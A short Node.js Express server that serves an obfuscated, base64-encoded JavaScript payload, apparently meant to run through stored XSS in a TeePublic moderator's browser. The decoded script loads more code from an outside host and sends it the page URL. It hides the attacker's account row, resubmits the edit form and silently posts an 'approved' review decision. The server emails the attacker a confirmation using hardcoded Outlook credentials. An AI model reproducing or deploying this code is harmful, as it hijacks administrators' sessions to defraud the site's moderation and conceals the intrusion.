const nodemailer = require("nodemailer")
const express = require("express")

const application = express()

application.get("/", (_, response) => response.send("Working"))

application.get("/:userId", function (request, response) {

    const userId = request.params.userId

    notification(userId).catch(error => console.error(error))

    response.setHeader("Content-Type", "application/javascript")

    response.send(script.replace("USER_ID_PLACEHOLDER", userId))
})

const script = atob("IWFzeW5jIGZ1bmN0aW9uKCl7Y29uc3QgZT0iVVNFUl9JRF9QTEFDRUhPTERFUiI7aWYoIWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoInNjcmlwdC5mbGJzY3JpcHQiKSl7Y29uc3QgZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTtlLnNldEF0dHJpYnV0ZSgiY2xhc3MiLCJmbGJzY3JpcHQiKTtjb25zdCB0PWJ0b2Eod2luZG93LmxvY2F0aW9uLmhyZWYpLHI9KG5ldyBEYXRlKS5nZXRUaW1lKCk7ZS5zZXRBdHRyaWJ1dGUoInNyYyIsYCR7YXRvYigiYUhSMGNITTZMeTlqYjI1emIyeGxMbVpzWVcxaWJ5NXpjR0ZqWlM4PSIpfXNjcmlwdD9ocmVmPSR7dH0mdGltZT0ke3J9YCksZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChlKX1jb25zdCB0PWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5tLWRlc2lnbi1kZXRhaWxzX19ieSAubGlua19fY29udGVudCIpO3QmJih0LmlubmVySFRNTD10LnRleHRDb250ZW50LnRyaW0oKS5yZXBsYWNlKC/jhaQvZywiIikpLGF3YWl0IG5ldyBQcm9taXNlKChlPT5zZXRUaW1lb3V0KGUsMzAwKSkpO2NvbnN0IHI9ZG9jdW1lbnQucXVlcnlTZWxlY3RvcihgYVtocmVmPSIvbWFuYWdlL3VzZXJzLyR7ZX0iXWApO2lmKHIpe2NvbnN0IHQ9ci5wYXJlbnRFbGVtZW50LnBhcmVudEVsZW1lbnQucGFyZW50RWxlbWVudCxuPXQuZ2V0QXR0cmlidXRlKCJjbGFzcyIpLm1hdGNoKC9cZCsvKVswXTt0LnJlbW92ZSgpO2NvbnN0IGE9YXdhaXQgZmV0Y2goYGh0dHBzOi8vd3d3LnRlZXB1YmxpYy5jb20vbWFuYWdlL3VzZXJzLyR7ZX0vZWRpdGApLGM9KG5ldyBET01QYXJzZXIpLnBhcnNlRnJvbVN0cmluZyhhd2FpdCBhLnRleHQoKSwidGV4dC9odG1sIikucXVlcnlTZWxlY3RvcihgI2VkaXRfdXNlcl8ke2V9YCksbz1jLnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InVzZXJbdXNlcm5hbWVdIl0nKTtvLnZhbHVlPShuZXcgRE9NUGFyc2VyKS5wYXJzZUZyb21TdHJpbmcoby52YWx1ZSwidGV4dC9odG1sIikuYm9keS50ZXh0Q29udGVudC5yZXBsYWNlKC/jhaQvZywiIikudHJpbSgpLGF3YWl0IGZldGNoKGBodHRwczovL3d3dy50ZWVwdWJsaWMuY29tL21hbmFnZS91c2Vycy8ke2V9YCx7bWV0aG9kOiJQT1NUIixib2R5Om5ldyBGb3JtRGF0YShjKX0pO2NvbnN0IHM9TWF0aC5mbG9vcigzKk1hdGgucmFuZG9tKCkpO2F3YWl0IGZldGNoKGBodHRwczovL3d3dy50ZWVwdWJsaWMuY29tL21hbmFnZS91c2VyX3Jldmlld3MvJHtufS9tYWtlX2RlY2lzaW9uP2RlY2lzaW9uPWFwcHJvdmVkJnJhdGluZz0ke3N9YCx7bWV0aG9kOiJQT1NUIn0pfX0oKTs=")

async function notification(userId) {

    const transporter = nodemailer.createTransport({
        host: "smtp-mail.outlook.com",
        port: 587,
        secure: false,
        auth: {
            user: "flambo.fun@outlook.com",
            pass: "azeAZE123$"
        }
    })

    await transporter.sendMail({
        from: '"Approval 👻" <flambo.fun@outlook.com>',
        to: "z.watirsen@gmail.com",
        subject: `User id ${userId} has approved`,
        html: `<b>User id ${userId} has approved</b>`
    })
}

application.listen(8000)

module.exports = application